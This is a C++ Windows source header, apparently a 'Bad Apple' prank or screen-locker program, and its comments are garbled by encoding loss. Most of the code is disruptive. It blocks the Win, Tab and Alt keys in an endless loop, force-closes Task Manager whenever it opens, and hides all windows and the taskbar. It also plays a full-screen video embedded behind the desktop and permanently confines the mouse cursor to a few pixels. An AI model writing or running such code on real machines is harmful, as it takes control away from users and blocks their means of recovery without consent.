#pragma once
#include<Windows.h>
#include<stdio.h>

DWORD WINAPI KeyBroad() {
    while (1) {

        if (GetAsyncKeyState(VK_LWIN) & 0x01) {
            keybd_event(VK_LWIN, 0, KEYEVENTF_KEYUP, 0);
            keybd_event(0x52, 0, KEYEVENTF_KEYUP, 0);
        }

        if (GetAsyncKeyState(VK_TAB) & 0x01) {
            keybd_event(VK_TAB, 0, KEYEVENTF_KEYUP, 0);
            keybd_event(VK_MENU, 0, KEYEVENTF_KEYUP, 0);
        }

        if (GetAsyncKeyState(VK_MENU) & 0x01) {
            keybd_event(VK_F4, 0, KEYEVENTF_KEYUP, 0);
            keybd_event(VK_MENU, 0, KEYEVENTF_KEYUP, 0);
        }

        HWND hd = FindWindow("TaskManagerWindow", "���������");
        if (hd != NULL)
        {
            SendMessage(hd, WM_CLOSE, 0, 0);
        }
        hd = NULL;
    }
}

//Ѱ��WorkerW-2���ڲ�����,ͬʱҲ����WorkerW-1����
/*(���մ���Z�����µ���,����Ļ������Ļ��,���Ӵ������ڸ�����֮�ϵ�)
    * ""WokerW-1
        * ""SHELLDLL_DefView
            * "FolderView"SysListView32
                * ...
    * ""WokerW-2
    * "Program Manager"Program
        * (��Ƶ�������ڵ�λ��)
*/
BOOL CALLBACK EnumWinProc(HWND hwnd, LPARAM lParam)
{
    HWND hDefView = FindWindowEx(hwnd, 0, "SHELLDLL_DefView", 0);
    //ͨ�������ھ���봰��������Ѱ�Ҵ�������ȡ���,�����ȡ�ɹ�,����ȡ����SHELLDLL_DefView������ڵľ��

    //����˵��ʱ��hwndΪWorkW-1�ľ��(��ȡ�ɹ�ʱ)

    HWND hSysListView32 = FindWindowEx(hDefView, 0, "SysListView32", 0);

    if (hDefView != NULL) {
        HWND hWorkerw = FindWindowEx(0, hwnd, "WorkerW", 0);
        //��ΪWorkW-1ΪWorkerW-2���Ӵ���,����ͨ��������ȡWokerW-2�ľ��

        ShowWindow(hSysListView32, SW_HIDE);
        ShowWindow(hwnd, SW_SHOW);              //����WorkW-1
        ShowWindow(hDefView, SW_SHOW);   
        ShowWindow(hWorkerw, SW_HIDE);      //����WorkW-2
        return FALSE;
    }
    return TRUE;
}


BOOL CALLBACK HideAll(HWND hwnd, LPARAM lParam)
{
    HWND hDeskTop = FindWindowEx(0, 0, "#32769 (����)", 0);
    HWND hProgman = FindWindowA( "Progman", 0);
    HWND hVideo = FindWindowA("mpv", 0);
    if (hwnd != NULL&& hwnd!=hProgman&& hwnd != hVideo)
    {

        //SendMessage(hwnd, WM_CLOSE, 0, 0);
        ShowWindow(hwnd, SW_HIDE);
    }

    if (hDeskTop != NULL) 
    {
        return FALSE;
    }
    return TRUE;
}

BOOL CALLBACK ShowAll(HWND hwnd, LPARAM lParam)
{
    HWND hDeskTop = FindWindowEx(0, 0, "#32769 (����)", 0);
    if (hwnd != NULL)
    {

        //SendMessage(hwnd, WM_CLOSE, 0, 0);
        ShowWindow(hwnd, SW_SHOW);
    }

    if (hDeskTop != NULL)
    {
        return FALSE;
    }
    return TRUE;
}


DWORD WINAPI BadApple()
{

    keybd_event(VK_LWIN, 0, 0 , 0);
    keybd_event(0x44, 0, 0, 0);
    Sleep(200);
    keybd_event(VK_LWIN, 0, KEYEVENTF_KEYUP, 0);
    keybd_event(0x44, 0, KEYEVENTF_KEYUP, 0);

    STARTUPINFO si{ 0 };
    PROCESS_INFORMATION pi{ 0 };
    //������ʾ����
    while (CreateProcess("src\\mpv.exe", (LPSTR)" src\\vidio.mp4 --fs", 0, 0, 0, CREATE_NO_WINDOW, 0, 0, (LPSTARTUPINFOA)&si, (LPPROCESS_INFORMATION)&pi)) //������Ƶ���ڽ�����ʾ��Ƶ
    {
        Sleep(1000);
        //��ȡ���洰�ڵľ��
        HWND hVideoParent = FindWindowA("Progman", 0);
        //����0x52c��Ϣ
        SendMessage(hVideoParent, 0x52c, 0, 0);
        //��ȡ��Ƶ���ڵľ��
        HWND hVideo = FindWindowA("mpv", 0);
        //ö�ٴ����ҵ�WorkerW-2��������
        
        EnumWindows(HideAll, 0);
        EnumWindows(EnumWinProc, 0);

        HWND hTaksbar = FindWindowA("Shell_TrayWnd", 0);
        ShowWindow(hTaksbar,SW_HIDE);

        //����Ƶ��������Ϊ���洰�ڵ��Ӵ���
        SetParent(hVideo, hVideoParent);

        ShowWindow(hVideoParent, SW_SHOW);
        ShowWindow(hVideo, SW_SHOW);
        //HWND hSeft = FindWindowA("ConsoleWindowClass", 0);
        //SetParent(hSeft, hVideo);

        Sleep(240);
        break;
    }

    return 0;

}

DWORD WINAPI Mouse() 
{
    HWND hq = FindWindowA("ConsoleWindowClass", 0);
    HWND dh = GetDesktopWindow();

    RECT rect, dhr;
    GetWindowRect(hq, &rect);
    GetWindowRect(dh, &dhr);
    Sleep(100);
    MoveWindow(hq, -20, -50, 100, 100, 1);

    rect.bottom = 10;
    rect.right = 5;
    rect.left = 0;
    rect.top = 0;
    
    while (1) {
        ClipCursor(&rect);
    }
    

    /*
        int t = 200000;
        while (t--) {
            ClipCursor(&rect);
            if (GetAsyncKeyState(VK_TAB) & 0x01) {
                break;
            }
        }*/
    ::Sleep(10000);
    ClipCursor(NULL);//�ͷ�
    return 0;
}